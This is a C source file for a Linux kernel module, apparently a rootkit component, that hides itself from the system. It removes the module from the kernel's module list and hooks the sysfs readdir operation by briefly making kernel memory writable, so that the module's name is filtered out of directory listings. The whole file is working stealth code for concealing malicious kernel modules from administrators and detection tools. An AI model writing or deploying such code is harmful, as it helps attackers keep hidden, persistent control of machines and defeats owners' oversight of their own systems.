#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/fs.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hide_module.h"


/// sysfs stuff
typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
fun_int_file_dirent_filldir_t original_sysfs_readdir;
filldir_t original_sysfs_filldir;

int hidden = 0;

int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    if (strcmp(name, THIS_MODULE->name) == 0){
        OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
        return 0;
    }
    return original_sysfs_filldir(__buf, name, namelen, offset, ino, d_type);
}

int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
    OUR_DEBUG("Hooked sysfs_readdir.\n");
    original_sysfs_filldir = filldir;
    return original_sysfs_readdir(filp, dirent, hooked_sysfs_filldir);
}


void hook_sysfs(void){
    struct file_operations* sysfs_dir_ops;
    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
    original_sysfs_readdir = sysfs_dir_ops->readdir;
    make_page_writable((long unsigned int) sysfs_dir_ops);
    sysfs_dir_ops->readdir = hooked_sysfs_readdir;
    make_page_readonly((long unsigned int) sysfs_dir_ops);
}


void unhook_sysfs(void){
    struct file_operations* sysfs_dir_ops;
    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
    make_page_writable((long unsigned int) sysfs_dir_ops);
    sysfs_dir_ops->readdir = original_sysfs_readdir;
    make_page_readonly((long unsigned int) sysfs_dir_ops);
}

/*
 * Hiding a module is basically just removing it from the list of modules
 */
void hide_module(void)
{
    if(hidden == 1)
        return;
    list_del(&(THIS_MODULE->list));

    hidden = 1;
    hook_sysfs();
}


void unhide_module(void)
{
    if(hidden == 0)
        return;

    list_add(&(THIS_MODULE->list), (struct list_head *) ptr_modules);

    hidden = 0;
    unhook_sysfs();
}
